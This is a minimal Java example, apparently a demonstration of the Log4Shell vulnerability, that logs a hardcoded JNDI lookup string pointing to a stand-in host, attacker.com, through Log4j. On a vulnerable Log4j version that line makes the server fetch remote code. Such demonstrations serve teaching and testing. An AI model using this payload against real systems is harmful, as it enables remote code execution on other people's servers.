import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4ShellExample {

    private static final Logger logger = LogManager.getLogger(Log4ShellExample.class);

    public static void main(String[] args) {
        
        String userInput = "${jndi:ldap://attacker.com/a}";
        
        logger.error("User input: " + userInput);
        
        System.out.println("Log4Shell vulnerable example executed.");
    }
}
